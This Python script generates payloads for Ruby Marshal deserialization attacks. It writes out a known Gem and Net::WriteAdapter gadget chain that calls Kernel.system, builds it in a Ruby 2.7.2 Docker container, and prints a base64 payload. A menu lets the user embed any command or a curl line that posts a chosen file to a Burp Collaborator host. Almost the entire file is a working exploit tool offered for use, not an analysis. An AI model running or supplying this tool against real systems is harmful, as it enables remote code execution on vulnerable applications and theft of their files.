import subprocess
import os

# Console output colors
GREEN = "\033[92m"
WHITE = "\033[97m"
RESET = "\033[0m"
ORANGE = "\033[38;5;214m"
RED = "\033[91m"


def get_payload():
    while True:
        print("\nWhat do you want to do?\n")
        print(f"{ORANGE}1.{RESET} Exfiltrate file")
        print(f"{ORANGE}2.{RESET} Execute custom command\n")
        tipo_accion = input("Select an option: ").strip()

        if tipo_accion == "1":
            ruta_archivo = input("\nEnter the absolute path to the file: ").strip()
            burp_server = input("\nEnter Burp Collaborator server: ").strip()
            user_input = f"/usr/bin/curl --data @{ruta_archivo} {burp_server}"
            break
        elif tipo_accion == "2":
            user_input = input("\nEnter the command to be executed: ").strip()
            break
        else:
            print(f"{RED}\nInvalid option. Please try again.{RESET}")

    # Write the Ruby script with the custom payload injected
    ruby_script = f"""
# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "{user_input}")

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")

n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts Base64.strict_encode64(payload)
"""
    # Write the Ruby script to a temporary file
    with open("borrar.rb", "w") as f:
        f.write(ruby_script)

    # Execute the Ruby script using Docker
    result = subprocess.run(['docker', 'run', '--rm', '-v', f'{subprocess.os.getcwd()}/borrar.rb:/app/borrar.rb',
                             'ruby:2.7.2', 'bash', '-c', 'ruby /app/borrar.rb'], capture_output=True, text=True)

    # Print the output (base64 serialized object)
    if result.returncode == 0:
        print("\nGenerated Payload (Base64):\n")
        print(result.stdout.strip())  # Remove leading/trailing whitespace
    else:
        print("\nError executing Ruby script:\n")
        print(result.stderr)

    # Remove the file after execution
    try:
        os.remove("borrar.rb")
    except Exception as e:
        print(f"\nError deleting borrar.rb: {e}")

    while True:
        print("\nDo you want to generate another custom payload?\n")
        print(f"1. Yes")
        print(f"2. No\n")
        respuesta = input("Select an option: ").strip()

        if respuesta == "1":
            get_payload()
        elif respuesta == "2":
            #print(f"{GREEN}\nExiting...\n{RESET}")
            exit()
        else:
            print(f"{RED}Invalid option. Please try again.{RESET}")


# Run the function to get the payload
get_payload()
